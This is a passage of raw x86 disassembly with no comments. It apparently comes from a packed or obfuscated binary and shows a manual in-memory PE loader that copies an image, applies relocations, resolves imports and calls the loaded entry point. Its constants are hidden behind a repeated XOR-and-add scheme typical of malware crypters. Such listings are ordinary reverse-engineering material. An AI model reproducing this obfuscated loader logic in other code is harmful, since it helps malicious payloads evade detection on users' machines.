  426758:	mov    DWORD PTR [ebp-0x4],eax
  42675b:	mov    edx,DWORD PTR [ebp-0x4]
  42675e:	mov    eax,0x7e0da2f
  426763:	mov    DWORD PTR [edx],eax
  426765:	mov    edx,DWORD PTR [ebp-0x8]
  426768:	cmp    edx,eax
  42676a:	jne    0x426770
  42676c:	mov    BYTE PTR [ecx+0x7],0x56
  426770:	mov    eax,DWORD PTR [ebp+0x8]
  426773:	mov    BYTE PTR [ecx+0x1],0x14
  426777:	mov    BYTE PTR [eax+0x9],0x2f
  42677b:	leave  
  42677c:	ret    0x4
  42677f:	push   ebp
  426780:	mov    ebp,esp
  426782:	push   ecx
  426783:	push   ecx
  426784:	lea    eax,[ebp-0x8]
  426787:	mov    DWORD PTR [ebp-0x4],eax
  42678a:	push   esi
  42678b:	mov    esi,DWORD PTR [ebp-0x4]
  42678e:	mov    eax,0x7060e3c
  426793:	mov    DWORD PTR [esi],eax
  426795:	mov    esi,DWORD PTR [ebp-0x8]
  426798:	cmp    esi,eax
  42679a:	pop    esi
  42679b:	jne    0x4267a7
  42679d:	mov    BYTE PTR [edx+0x4],0x12
  4267a1:	mov    WORD PTR [ecx+0x3],0x121f
  4267a7:	mov    BYTE PTR [edx],0x3e
  4267aa:	leave  
  4267ab:	ret    
  4267ac:	push   ebp
  4267ad:	mov    ebp,esp
  4267af:	push   ecx
  4267b0:	push   ecx
  4267b1:	lea    eax,[ebp-0x8]
  4267b4:	mov    DWORD PTR [ebp-0x4],eax
  4267b7:	mov    edx,DWORD PTR [ebp-0x4]
  4267ba:	mov    eax,0xf8870b3f
  4267bf:	mov    DWORD PTR [edx],eax
  4267c1:	mov    edx,DWORD PTR [ebp-0x8]
  4267c4:	cmp    edx,eax
  4267c6:	jne    0x4267d3
  4267c8:	mov    eax,DWORD PTR [ebp+0x8]
  4267cb:	mov    BYTE PTR [ecx+0x8],0xe
  4267cf:	mov    BYTE PTR [eax+0x1],0x14
  4267d3:	mov    BYTE PTR [ecx+0x5],0xa
  4267d7:	leave  
  4267d8:	ret    0x4
  4267db:	push   esi
  4267dc:	mov    ecx,edi
  4267de:	call   0x4267ac
  4267e3:	mov    edx,edi
  4267e5:	mov    ecx,esi
  4267e7:	mov    BYTE PTR [esi],0x1e
  4267ea:	call   0x42677f
  4267ef:	push   esi
  4267f0:	mov    ecx,edi
  4267f2:	mov    BYTE PTR [esi+0x5],0xa
  4267f6:	call   0x426750
  4267fb:	push   esi
  4267fc:	mov    BYTE PTR [esi+0x6],0xe
  426800:	call   0x42671d
  426805:	mov    BYTE PTR [esi+0x2],0x11
  426809:	mov    edx,esi
  42680b:	jmp    0x4266ed
  426810:	push   ebp
  426811:	mov    ebp,esp
  426813:	push   ecx
  426814:	mov    ecx,DWORD PTR [edx+0x194]
  42681a:	push   esi
  42681b:	mov    esi,DWORD PTR [ebp+0x8]
  42681e:	mov    esi,DWORD PTR [esi]
  426820:	mov    DWORD PTR [ecx],esi
  426822:	mov    ecx,DWORD PTR [edx+0x194]
  426828:	mov    ecx,DWORD PTR [ecx]
  42682a:	mov    esi,DWORD PTR [edx+0x190]
  426830:	mov    DWORD PTR [esi],ecx
  426832:	mov    eax,DWORD PTR [edx+0x194]
  426838:	mov    ecx,DWORD PTR [eax]
  42683a:	mov    ecx,DWORD PTR [ecx+0x3c]
  42683d:	add    ecx,DWORD PTR [eax]
  42683f:	mov    DWORD PTR [ebp-0x4],0xf89ca5a5
  426846:	mov    eax,DWORD PTR [ebp-0x4]
  426849:	movzx  ecx,WORD PTR [ecx+0x16]
  42684d:	xor    eax,0x75108aa
  426852:	add    eax,0x3272f1
  426857:	pop    esi
  426858:	test   ecx,eax
  42685a:	je     0x426868
  42685c:	mov    eax,DWORD PTR [edx+0x1c8]
  426862:	mov    DWORD PTR [eax],0xf89c85ba
  426868:	leave  
  426869:	ret    0x4
  42686c:	push   ebp
  42686d:	mov    ebp,esp
  42686f:	sub    esp,0x70
  426872:	and    DWORD PTR [ebp-0x20],0x0
  426876:	mov    DWORD PTR [ebp-0x18],0xf89cb5a5
  42687d:	mov    DWORD PTR [ebp-0x1c],0xf89c85e5
  426884:	mov    DWORD PTR [ebp-0x2c],0xf89c85b9
  42688b:	mov    DWORD PTR [ebp-0x14],0xf89c85bb
  426892:	mov    DWORD PTR [ebp-0x2c],0xf89f05a5
  426899:	mov    eax,DWORD PTR [ebp+0x20]
  42689c:	mov    eax,DWORD PTR [eax+0x194]
  4268a2:	mov    DWORD PTR [ebp-0xc],eax
  4268a5:	mov    eax,DWORD PTR [ebp+0x20]
  4268a8:	push   ebx
  4268a9:	push   esi
  4268aa:	mov    esi,DWORD PTR [eax+0x190]
  4268b0:	mov    eax,DWORD PTR [ebp+0x20]
  4268b3:	mov    eax,DWORD PTR [eax+0x18c]
  4268b9:	mov    DWORD PTR [ebp-0x8],eax
  4268bc:	mov    eax,DWORD PTR [eax]
  4268be:	push   edi
  4268bf:	mov    DWORD PTR [ebp-0x4],esi
  4268c2:	test   eax,eax
  4268c4:	jne    0x4268d1
  4268c6:	push   DWORD PTR [ebp+0x1c]
  4268c9:	mov    edx,DWORD PTR [ebp+0x20]
  4268cc:	call   0x426810
  4268d1:	mov    eax,DWORD PTR [esi]
  4268d3:	mov    ebx,DWORD PTR [esi]
  4268d5:	add    ebx,DWORD PTR [eax+0x3c]
  4268d8:	mov    eax,DWORD PTR [ebp+0xc]
  4268db:	mov    ecx,DWORD PTR [ebp-0x8]
  4268de:	mov    ecx,DWORD PTR [ecx]
  4268e0:	mov    esi,0x75108aa
  4268e5:	xor    eax,esi
  4268e7:	mov    edi,0x3272f1
  4268ec:	add    eax,edi
  4268ee:	cmp    eax,ecx
  4268f0:	jne    0x426b28
  4268f6:	mov    eax,DWORD PTR [ebp-0xc]
  4268f9:	mov    eax,DWORD PTR [eax]
  4268fb:	mov    DWORD PTR [ebp-0x10],eax
  4268fe:	mov    eax,DWORD PTR [ebx+0x50]
  426901:	mov    DWORD PTR [ebp-0x68],eax
  426904:	mov    eax,DWORD PTR [ebp-0x18]
  426907:	xor    eax,esi
  426909:	add    eax,edi
  42690b:	mov    DWORD PTR [ebp-0x64],eax
  42690e:	mov    eax,DWORD PTR [ebp-0x14]
  426911:	and    DWORD PTR [ebp-0x6c],0x0
  426915:	xor    eax,esi
  426917:	add    eax,edi
  426919:	mov    DWORD PTR [ebp-0x60],eax
  42691c:	lea    eax,[ebp-0x70]
  42691f:	push   eax
  426920:	mov    eax,DWORD PTR [ebp+0x8]
  426923:	xor    eax,esi
  426925:	add    eax,edi
  426927:	push   eax
  426928:	mov    eax,DWORD PTR [ebp+0x20]
  42692b:	add    eax,0xaa
  426930:	push   eax
  426931:	mov    eax,DWORD PTR [ebp+0x20]
  426934:	mov    eax,DWORD PTR [eax+0x198]
  42693a:	mov    DWORD PTR [ebp-0x70],0x4
  426941:	push   DWORD PTR [eax]
  426943:	mov    eax,DWORD PTR [ebp+0x10]
  426946:	call   eax
  426948:	mov    ecx,DWORD PTR [ebp-0xc]
  42694b:	mov    ecx,DWORD PTR [ecx]
  42694d:	mov    edx,DWORD PTR [ebp-0x8]
  426950:	mov    DWORD PTR [ebp-0x6c],eax
  426953:	mov    DWORD PTR [ebp+0x1c],eax
  426956:	mov    DWORD PTR [edx],ecx
  426958:	mov    ecx,DWORD PTR [ebp-0x4]
  42695b:	mov    DWORD PTR [ecx],eax
  42695d:	mov    eax,DWORD PTR [ebx+0x50]
  426960:	mov    DWORD PTR [ebp-0x68],eax
  426963:	mov    eax,DWORD PTR [ebp-0x1c]
  426966:	xor    eax,esi
  426968:	add    eax,edi
  42696a:	mov    DWORD PTR [ebp-0x64],eax
  42696d:	lea    eax,[ebp-0x20]
  426970:	mov    DWORD PTR [ebp-0x60],eax
  426973:	lea    eax,[ebp-0x70]
  426976:	push   eax
  426977:	mov    eax,DWORD PTR [ebp+0x8]
  42697a:	xor    eax,esi
  42697c:	add    eax,edi
  42697e:	push   eax
  42697f:	mov    eax,DWORD PTR [ebp+0x20]
  426982:	add    eax,0xee
  426987:	push   eax
  426988:	mov    eax,DWORD PTR [ebp+0x20]
  42698b:	mov    eax,DWORD PTR [eax+0x198]
  426991:	mov    DWORD PTR [ebp-0x70],0x4
  426998:	push   DWORD PTR [eax]
  42699a:	mov    eax,DWORD PTR [ebp+0x10]
  42699d:	call   eax
  42699f:	test   eax,eax
  4269a1:	je     0x4269c6
  4269a3:	and    DWORD PTR [ebp+0xc],0x0
  4269a7:	cmp    DWORD PTR [ebx+0x50],0x0
  4269ab:	jbe    0x4269c6
  4269ad:	mov    eax,DWORD PTR [ebp+0x1c]
  4269b0:	mov    ecx,DWORD PTR [ebp-0x10]
  4269b3:	sub    ecx,eax
  4269b5:	mov    dl,BYTE PTR [ecx+eax*1]
  4269b8:	inc    DWORD PTR [ebp+0xc]
  4269bb:	mov    BYTE PTR [eax],dl
  4269bd:	mov    edx,DWORD PTR [ebp+0xc]
  4269c0:	inc    eax
  4269c1:	cmp    edx,DWORD PTR [ebx+0x50]
  4269c4:	jb     0x4269b5
  4269c6:	mov    edx,DWORD PTR [ebp+0x1c]
  4269c9:	mov    ecx,DWORD PTR [edx+0x3c]
  4269cc:	add    ecx,edx
  4269ce:	mov    eax,DWORD PTR [ecx+0xa0]
  4269d4:	mov    ebx,DWORD PTR [ecx+0x28]
  4269d7:	add    eax,edx
  4269d9:	sub    edx,DWORD PTR [ebp-0x10]
  4269dc:	add    ebx,DWORD PTR [ebp+0x1c]
  4269df:	mov    DWORD PTR [ebp+0xc],edx
  4269e2:	mov    DWORD PTR [ebp-0x2c],ecx
  4269e5:	mov    DWORD PTR [ebp-0x14],ebx
  4269e8:	mov    DWORD PTR [ebp-0x8],0x0
  4269ef:	jmp    0x426a6b
  4269f1:	add    edx,0xfffffff8
  4269f4:	shr    edx,1
  4269f6:	mov    DWORD PTR [ebp-0x18],edx
  4269f9:	je     0x426a57
  4269fb:	lea    edx,[eax+0x8]
  4269fe:	mov    DWORD PTR [ebp-0x4],edx
  426a01:	mov    edx,DWORD PTR [ebp-0x18]
  426a04:	mov    DWORD PTR [ebp-0x18],edx
  426a07:	mov    edx,DWORD PTR [ebp-0x4]
  426a0a:	movzx  edx,WORD PTR [edx]
  426a0d:	mov    DWORD PTR [ebp-0x24],edx
  426a10:	and    edx,0xfff
  426a16:	mov    DWORD PTR [ebp-0x28],edx
  426a19:	mov    edx,DWORD PTR [ebp-0x24]
  426a1c:	shr    edx,0xc
  426a1f:	add    edx,0xffcd8d0f
  426a25:	xor    edx,esi
  426a27:	cmp    edx,0xf89c85b8
  426a2d:	jne    0x426a4e
  426a2f:	mov    edx,DWORD PTR [ebp-0x28]
  426a32:	add    edx,DWORD PTR [ebp+0x1c]
  426a35:	mov    ebx,DWORD PTR [eax]
  426a37:	cmp    DWORD PTR [ebx+edx*1],0x0
  426a3b:	je     0x426a4b
  426a3d:	mov    ecx,DWORD PTR [ebp+0xc]
  426a40:	add    ecx,DWORD PTR [ebx+edx*1]
  426a43:	mov    ebx,DWORD PTR [eax]
  426a45:	mov    DWORD PTR [edx+ebx*1],ecx
  426a48:	mov    ecx,DWORD PTR [ebp-0x2c]
  426a4b:	mov    ebx,DWORD PTR [ebp-0x14]
  426a4e:	add    DWORD PTR [ebp-0x4],0x2
  426a52:	dec    DWORD PTR [ebp-0x18]
  426a55:	jne    0x426a07
  426a57:	mov    edx,DWORD PTR [ebp-0xc]
  426a5a:	add    DWORD PTR [ebp-0x8],edx
  426a5d:	mov    edx,DWORD PTR [ebp-0x8]
  426a60:	cmp    edx,DWORD PTR [ecx+0xa4]
  426a66:	jae    0x426a79
  426a68:	add    eax,DWORD PTR [ebp-0xc]
  426a6b:	mov    edx,DWORD PTR [eax+0x4]
  426a6e:	mov    DWORD PTR [ebp-0xc],edx
  426a71:	test   edx,edx
  426a73:	jne    0x4269f1
  426a79:	mov    eax,DWORD PTR [ebp-0x10]
  426a7c:	mov    DWORD PTR [ebp-0x6c],eax
  426a7f:	mov    DWORD PTR [ebp-0x70],0x4
  426a86:	mov    eax,DWORD PTR [ecx+0x50]
  426a89:	mov    DWORD PTR [ebp-0x68],eax
  426a8c:	mov    eax,DWORD PTR [ebp-0x1c]
  426a8f:	xor    eax,esi
  426a91:	add    eax,edi
  426a93:	mov    DWORD PTR [ebp-0x64],eax
  426a96:	lea    eax,[ebp-0x20]
  426a99:	mov    DWORD PTR [ebp-0x60],eax
  426a9c:	lea    eax,[ebp-0x70]
  426a9f:	push   eax
  426aa0:	mov    eax,DWORD PTR [ebp+0x8]
  426aa3:	xor    eax,esi
  426aa5:	add    eax,edi
  426aa7:	push   eax
  426aa8:	mov    eax,DWORD PTR [ebp+0x20]
  426aab:	add    eax,0xee
  426ab0:	push   eax
  426ab1:	mov    eax,DWORD PTR [ebp+0x20]
  426ab4:	mov    eax,DWORD PTR [eax+0x198]
  426aba:	push   DWORD PTR [eax]
  426abc:	mov    eax,DWORD PTR [ebp+0x10]
  426abf:	call   eax
  426ac1:	mov    eax,DWORD PTR [ebp+0x20]
  426ac4:	mov    eax,DWORD PTR [eax+0x180]
  426aca:	add    eax,DWORD PTR [ebp+0xc]
  426acd:	mov    ecx,DWORD PTR [ebp+0xc]
  426ad0:	push   DWORD PTR [ebp+0x18]
  426ad3:	mov    DWORD PTR [eax],ecx
  426ad5:	push   DWORD PTR [ebp+0x14]
  426ad8:	push   DWORD PTR [ebp+0x1c]
  426adb:	call   ebx
  426add:	mov    ecx,DWORD PTR [ebp+0xc]
  426ae0:	add    ecx,DWORD PTR [ebp+0x20]
  426ae3:	lea    eax,[ebp+0x4]
  426ae6:	mov    DWORD PTR [ebp+0x20],ecx
  426ae9:	mov    ecx,DWORD PTR [ebp+0x20]
  426aec:	mov    ecx,DWORD PTR [ebp+0x20]
  426aef:	mov    edx,DWORD PTR [ecx+0x190]
  426af5:	mov    ecx,DWORD PTR [ebp+0x20]
  426af8:	mov    ecx,DWORD PTR [ecx+0x18c]
  426afe:	mov    esi,DWORD PTR [ecx]
  426b00:	cmp    DWORD PTR [eax],esi
  426b02:	jb     0x426b23
  426b04:	mov    esi,DWORD PTR [edx]
  426b06:	mov    edi,DWORD PTR [edx]
  426b08:	mov    esi,DWORD PTR [esi+0x3c]
  426b0b:	lea    esi,[edi+esi*1+0x50]
  426b0f:	mov    edi,DWORD PTR [ecx]
  426b11:	add    edi,DWORD PTR [esi]
  426b13:	cmp    DWORD PTR [eax],edi
  426b15:	jae    0x426b23
  426b17:	mov    esi,DWORD PTR [ecx]
  426b19:	mov    ecx,DWORD PTR [eax]
  426b1b:	mov    edx,DWORD PTR [edx]
  426b1d:	sub    ecx,esi
  426b1f:	add    edx,ecx
  426b21:	mov    DWORD PTR [eax],edx
  426b23:	mov    eax,DWORD PTR [ebp+0xc]
  426b26:	jmp    0x426b2a
  426b28:	xor    eax,eax
  426b2a:	pop    edi
  426b2b:	pop    esi
  426b2c:	pop    ebx
  426b2d:	leave  
  426b2e:	ret    0x1c
  426b31:	push   ebp
  426b32:	mov    ebp,esp
  426b34:	sub    esp,0x1c
  426b37:	push   esi
  426b38:	mov    esi,eax
  426b3a:	mov    eax,DWORD PTR [ecx+0x190]
  426b40:	cmp    DWORD PTR [eax],0x0
  426b43:	je     0x426c53
  426b49:	test   edx,edx
  426b4b:	je     0x426c53
  426b51:	test   esi,esi
  426b53:	je     0x426c53
  426b59:	mov    eax,DWORD PTR [esi+0x88]
  426b5f:	test   eax,eax
  426b61:	je     0x426c4e
  426b67:	cmp    DWORD PTR [esi+0x8c],0x10
  426b6e:	je     0x426c4e
  426b74:	cmp    DWORD PTR [esi+0x34],edx
  426b77:	je     0x426c4e
  426b7d:	mov    esi,DWORD PTR [ecx+0x18c]
  426b83:	and    DWORD PTR [ebp-0x10],0x0
  426b87:	mov    ecx,edx
  426b89:	sub    ecx,DWORD PTR [esi]
  426b8b:	add    eax,edx
  426b8d:	movzx  edx,WORD PTR [eax+0xc]
  426b91:	mov    DWORD PTR [ebp-0x1c],ecx
  426b94:	movzx  ecx,WORD PTR [eax+0xe]
  426b98:	add    ecx,edx
  426b9a:	je     0x426c4e
  426ba0:	lea    ecx,[eax+0x14]
  426ba3:	push   ebx
  426ba4:	mov    DWORD PTR [ebp-0x18],ecx
  426ba7:	mov    esi,0x7fffffff
  426bac:	push   edi
  426bad:	test   DWORD PTR [ecx],esi
  426baf:	je     0x426c30
  426bb1:	mov    edx,DWORD PTR [ecx]
  426bb3:	and    DWORD PTR [ebp-0xc],0x0
  426bb7:	and    edx,esi
  426bb9:	add    edx,eax
  426bbb:	movzx  edi,WORD PTR [edx+0xe]
  426bbf:	movzx  ebx,WORD PTR [edx+0xc]
  426bc3:	add    edi,ebx
  426bc5:	je     0x426c30
  426bc7:	lea    ecx,[edx+0x14]
  426bca:	mov    DWORD PTR [ebp-0x14],ecx
  426bcd:	test   DWORD PTR [ecx],esi
  426bcf:	je     0x426c12
  426bd1:	mov    ecx,DWORD PTR [ecx]
  426bd3:	and    DWORD PTR [ebp-0x8],0x0
  426bd7:	and    ecx,esi
  426bd9:	add    ecx,eax
  426bdb:	movzx  edi,WORD PTR [ecx+0xe]
  426bdf:	movzx  ebx,WORD PTR [ecx+0xc]
  426be3:	add    edi,ebx
  426be5:	je     0x426c12
  426be7:	lea    edi,[ecx+0x14]
  426bea:	mov    DWORD PTR [ebp-0x4],edi
  426bed:	mov    edi,DWORD PTR [ebp-0x4]
  426bf0:	mov    edi,DWORD PTR [edi]
  426bf2:	test   edi,edi
  426bf4:	je     0x426bfc
  426bf6:	mov    ebx,DWORD PTR [ebp-0x1c]
  426bf9:	add    DWORD PTR [edi+eax*1],ebx
  426bfc:	movzx  edi,WORD PTR [ecx+0xe]
  426c00:	movzx  ebx,WORD PTR [ecx+0xc]
  426c04:	inc    DWORD PTR [ebp-0x8]
  426c07:	add    DWORD PTR [ebp-0x4],0x8
  426c0b:	add    edi,ebx
  426c0d:	cmp    DWORD PTR [ebp-0x8],edi
  426c10:	jb     0x426bed
  426c12:	movzx  edi,WORD PTR [edx+0xe]
  426c16:	movzx  ebx,WORD PTR [edx+0xc]
  426c1a:	mov    ecx,DWORD PTR [ebp-0x14]
  426c1d:	inc    DWORD PTR [ebp-0xc]
  426c20:	add    ecx,0x8
  426c23:	add    edi,ebx
  426c25:	mov    DWORD PTR [ebp-0x14],ecx
  426c28:	cmp    DWORD PTR [ebp-0xc],edi
  426c2b:	jb     0x426bcd
  426c2d:	mov    ecx,DWORD PTR [ebp-0x18]
  426c30:	movzx  edx,WORD PTR [eax+0xe]
  426c34:	movzx  edi,WORD PTR [eax+0xc]
  426c38:	inc    DWORD PTR [ebp-0x10]
  426c3b:	add    ecx,0x8
  426c3e:	add    edx,edi
  426c40:	mov    DWORD PTR [ebp-0x18],ecx
  426c43:	cmp    DWORD PTR [ebp-0x10],edx
  426c46:	jb     0x426bad
  426c4c:	pop    edi
  426c4d:	pop    ebx
  426c4e:	xor    eax,eax
  426c50:	inc    eax
  426c51:	jmp    0x426c55
  426c53:	xor    eax,eax
  426c55:	pop    esi
  426c56:	leave  
  426c57:	ret    
  426c58:	push   ebp
  426c59:	mov    ebp,esp
  426c5b:	mov    ecx,DWORD PTR [ecx+0x190]
  426c61:	mov    eax,DWORD PTR [ebp+0xc]
  426c64:	sub    esp,0x10
  426c67:	push   ebx
  426c68:	xor    ebx,ebx
  426c6a:	push   esi
  426c6b:	push   edi
  426c6c:	cmp    DWORD PTR [ecx],ebx
  426c6e:	je     0x426cf6
  426c74:	cmp    eax,ebx
  426c76:	je     0x426cf6
  426c78:	cmp    DWORD PTR [eax+0x78],ebx
  426c7b:	jne    0x426c82
  426c7d:	xor    eax,eax
  426c7f:	inc    eax
  426c80:	jmp    0x426cf8
  426c82:	mov    eax,DWORD PTR [eax+0x78]
  426c85:	add    eax,DWORD PTR [ebp+0x8]
  426c88:	mov    ecx,DWORD PTR [eax+0x1c]
  426c8b:	mov    edx,DWORD PTR [eax+0x24]
  426c8e:	mov    esi,DWORD PTR [eax+0x14]
  426c91:	mov    edi,DWORD PTR [eax+0x18]
  426c94:	add    ecx,DWORD PTR [ebp+0x8]
  426c97:	add    edx,DWORD PTR [ebp+0x8]
  426c9a:	mov    DWORD PTR [ebp-0x4],esi
  426c9d:	cmp    esi,edi
  426c9f:	ja     0x426ca4
  426ca1:	mov    DWORD PTR [ebp-0x4],edi
  426ca4:	mov    DWORD PTR [ebp-0x8],ebx
  426ca7:	cmp    DWORD PTR [ebp-0x4],ebx
  426caa:	jbe    0x426c7d
  426cac:	cmp    ebx,DWORD PTR [eax+0x14]
  426caf:	jae    0x426cb7
  426cb1:	movzx  esi,WORD PTR [edx+ebx*2]
  426cb5:	jmp    0x426cb9
  426cb7:	mov    esi,ebx
  426cb9:	lea    esi,[ecx+esi*4]
  426cbc:	mov    edi,DWORD PTR [esi]
  426cbe:	test   edi,edi
  426cc0:	je     0x426ceb
  426cc2:	add    edi,DWORD PTR [ebp+0x8]
  426cc5:	mov    DWORD PTR [ebp-0x10],edi
  426cc8:	cmp    edi,eax
  426cca:	jbe    0x426cdc
  426ccc:	mov    ebx,DWORD PTR [ebp+0xc]
  426ccf:	mov    ebx,DWORD PTR [ebx+0x7c]
  426cd2:	add    ebx,eax
  426cd4:	cmp    edi,ebx
  426cd6:	jae    0x426cdc
  426cd8:	mov    esi,DWORD PTR [esi]
  426cda:	jmp    0x426ce4
  426cdc:	sub    edi,DWORD PTR [ebp+0x8]
  426cdf:	mov    DWORD PTR [esi],edi
  426ce1:	mov    esi,DWORD PTR [ebp-0x10]
  426ce4:	test   esi,esi
  426ce6:	je     0x426cf6
  426ce8:	mov    ebx,DWORD PTR [ebp-0x8]
  426ceb:	inc    ebx
  426cec:	mov    DWORD PTR [ebp-0x8],ebx
  426cef:	cmp    ebx,DWORD PTR [ebp-0x4]
  426cf2:	jb     0x426cac
  426cf4:	jmp    0x426c7d
  426cf6:	xor    eax,eax
  426cf8:	pop    edi
  426cf9:	pop    esi
  426cfa:	pop    ebx
  426cfb:	leave  
  426cfc:	ret    0x8
  426cff:	push   ebp
  426d00:	mov    ebp,esp
  426d02:	sub    esp,0x2c
  426d05:	mov    edx,0xf89c85a5
  426d0a:	mov    DWORD PTR [ebp-0x4],edx
  426d0d:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  426d14:	mov    eax,DWORD PTR [ebp-0x4]
  426d17:	mov    ecx,DWORD PTR [ebp-0x4]
  426d1a:	mov    ecx,DWORD PTR [ebp-0x4]
  426d1d:	mov    ecx,DWORD PTR [ebp-0x4]
  426d20:	mov    ecx,DWORD PTR [ebp-0x4]
  426d23:	mov    ecx,DWORD PTR [ebp-0x4]
  426d26:	push   ebx
  426d27:	mov    ebx,DWORD PTR [ebp+0x10]
  426d2a:	push   esi
  426d2b:	mov    esi,0x75108aa
  426d30:	mov    DWORD PTR [ebp-0x10],0x352eb2f
  426d37:	mov    ecx,DWORD PTR [ebp-0x4]
  426d3a:	mov    ebx,DWORD PTR [ebx+0x190]
  426d40:	push   edi
  426d41:	mov    edi,0x3272f1
  426d46:	xor    ecx,esi
  426d48:	xor    eax,esi
  426d4a:	add    eax,edi
  426d4c:	add    ecx,edi
  426d4e:	mov    DWORD PTR [ebp-0x18],eax
  426d51:	cmp    ecx,DWORD PTR [ebx]
  426d53:	je     0x426fd4
  426d59:	mov    ebx,DWORD PTR [ebp-0x4]
  426d5c:	mov    ecx,DWORD PTR [ebp+0xc]
  426d5f:	xor    ebx,esi
  426d61:	add    ebx,edi
  426d63:	cmp    ebx,ecx
  426d65:	je     0x426fd4
  426d6b:	mov    ebx,DWORD PTR [ebp-0x4]
  426d6e:	mov    ecx,DWORD PTR [ecx+0x80]
  426d74:	xor    ebx,esi
  426d76:	add    ebx,edi
  426d78:	cmp    ecx,ebx
  426d7a:	je     0x426fcf
  426d80:	add    ecx,DWORD PTR [ebp+0x8]
  426d83:	mov    DWORD PTR [ebp-0x2c],ecx
  426d86:	mov    ebx,edx
  426d88:	xor    ebx,esi
  426d8a:	add    ebx,edi
  426d8c:	mov    DWORD PTR [ebp-0x10],ebx
  426d8f:	mov    ebx,DWORD PTR [ebp-0x10]
  426d92:	cmp    ebx,edx
  426d94:	je     0x426da8
  426d96:	mov    edx,DWORD PTR [ebp-0x10]
  426d99:	mov    ebx,DWORD PTR [ebp-0x4]
  426d9c:	imul   edx,edx,0x14
  426d9f:	xor    ebx,esi
  426da1:	add    ebx,edi
  426da3:	cmp    DWORD PTR [edx+ecx*1],ebx
  426da6:	jne    0x426dbf
  426da8:	mov    edx,DWORD PTR [ebp-0x10]
  426dab:	mov    ebx,DWORD PTR [ebp-0x4]
  426dae:	imul   edx,edx,0x14
  426db1:	xor    ebx,esi
  426db3:	add    ebx,edi
  426db5:	cmp    DWORD PTR [edx+ecx*1+0x10],ebx
  426db9:	je     0x426fc1
  426dbf:	mov    eax,DWORD PTR [ebp-0x4]
  426dc2:	mov    ebx,DWORD PTR [ebp-0x4]
  426dc5:	mov    eax,DWORD PTR [ebp-0x10]
  426dc8:	imul   eax,eax,0x14
  426dcb:	add    eax,ecx
  426dcd:	mov    ecx,DWORD PTR [eax+0x10]
  426dd0:	add    ecx,DWORD PTR [ebp+0x8]
  426dd3:	xor    ebx,esi
  426dd5:	mov    DWORD PTR [ebp-0x1c],ecx
  426dd8:	mov    ecx,DWORD PTR [ebp-0x4]
  426ddb:	mov    edx,DWORD PTR [ebp-0x4]
  426dde:	xor    ecx,esi
  426de0:	add    ecx,edi
  426de2:	xor    edx,esi
  426de4:	mov    DWORD PTR [ebp-0x24],ecx
  426de7:	mov    ecx,DWORD PTR [eax]
  426de9:	add    edx,edi
  426deb:	add    ebx,edi
  426ded:	cmp    ecx,edx
  426def:	je     0x426df7
  426df1:	add    ecx,DWORD PTR [ebp+0x8]
  426df4:	mov    DWORD PTR [ebp-0x24],ecx
  426df7:	mov    ecx,DWORD PTR [ebp-0x4]
  426dfa:	xor    ecx,esi
  426dfc:	add    ecx,DWORD PTR [eax+0xc]
  426dff:	mov    eax,DWORD PTR [ebp+0x8]
  426e02:	lea    eax,[ecx+eax*1+0x3272f1]
  426e09:	mov    DWORD PTR [ebp+0xc],eax
  426e0c:	mov    DWORD PTR [ebp-0x28],0xf89c85be
  426e13:	mov    eax,DWORD PTR [ebp+0x10]
  426e16:	push   DWORD PTR [ebp+0xc]
  426e19:	mov    eax,DWORD PTR [eax+0x1e0]
  426e1f:	call   DWORD PTR [eax]
  426e21:	mov    ecx,DWORD PTR [ebp-0x4]
  426e24:	xor    ecx,esi
  426e26:	add    ecx,edi
  426e28:	mov    DWORD PTR [ebp-0xc],eax
  426e2b:	cmp    ecx,eax
  426e2d:	jne    0x426e41
  426e2f:	mov    eax,DWORD PTR [ebp+0x10]
  426e32:	push   DWORD PTR [ebp+0xc]
  426e35:	mov    eax,DWORD PTR [eax+0x1e0]
  426e3b:	call   DWORD PTR [eax+0xc]
  426e3e:	mov    DWORD PTR [ebp-0xc],eax
  426e41:	mov    DWORD PTR [ebp-0x20],0x7f661b22
  426e48:	mov    DWORD PTR [ebp-0x20],0xf89c9852
  426e4f:	mov    eax,DWORD PTR [ebp-0x4]
  426e52:	xor    eax,esi
  426e54:	add    eax,edi
  426e56:	cmp    eax,DWORD PTR [ebp-0xc]
  426e59:	jne    0x426e7e
  426e5b:	mov    eax,DWORD PTR [ebp-0x8]
  426e5e:	mov    ecx,DWORD PTR [ebp-0x20]
  426e61:	xor    eax,esi
  426e63:	xor    ecx,esi
  426e65:	lea    ebx,[ebx+eax*1+0x3272f1]
  426e6c:	mov    eax,DWORD PTR [ebp+0x10]
  426e6f:	mov    eax,DWORD PTR [eax+0x1e0]
  426e75:	add    ecx,edi
  426e77:	imul   ecx,ebx
  426e7a:	push   ecx
  426e7b:	call   DWORD PTR [eax+0x24]
  426e7e:	mov    eax,DWORD PTR [ebp-0x4]
  426e81:	xor    eax,esi
  426e83:	add    eax,edi
  426e85:	cmp    eax,DWORD PTR [ebp-0xc]
  426e88:	jne    0x426e99
  426e8a:	mov    eax,DWORD PTR [ebp-0x28]
  426e8d:	xor    eax,esi
  426e8f:	add    eax,edi
  426e91:	cmp    ebx,eax
  426e93:	jbe    0x426e13
  426e99:	mov    eax,DWORD PTR [ebp-0x4]
  426e9c:	xor    eax,esi
  426e9e:	add    eax,edi
  426ea0:	cmp    eax,DWORD PTR [ebp-0xc]
  426ea3:	jne    0x426ebc
  426ea5:	mov    eax,DWORD PTR [ebp-0x8]
  426ea8:	mov    ecx,DWORD PTR [ebp-0x18]
  426eab:	xor    eax,esi
  426ead:	lea    eax,[ecx+eax*1+0x3272f1]
  426eb4:	mov    DWORD PTR [ebp-0x18],eax
  426eb7:	jmp    0x426fab
  426ebc:	mov    DWORD PTR [ebp-0x14],0x1121b2d
  426ec3:	mov    DWORD PTR [ebp+0xc],0xe042d2f
  426eca:	mov    ebx,DWORD PTR [ebp-0x4]
  426ecd:	xor    ebx,esi
  426ecf:	add    ebx,edi
  426ed1:	jmp    0x426f98
  426ed6:	mov    eax,DWORD PTR [ebp-0x4]
  426ed9:	xor    eax,esi
  426edb:	add    eax,edi
  426edd:	mov    DWORD PTR [ebp-0x14],eax
  426ee0:	mov    eax,DWORD PTR [ebp-0x4]
  426ee3:	xor    eax,esi
  426ee5:	add    eax,edi
  426ee7:	mov    DWORD PTR [ebp+0xc],eax
  426eea:	mov    ecx,DWORD PTR [ebp-0x4]
  426eed:	mov    eax,DWORD PTR [ebp-0x24]
  426ef0:	xor    ecx,esi
  426ef2:	add    ecx,edi
  426ef4:	cmp    ecx,eax
  426ef6:	je     0x426efe
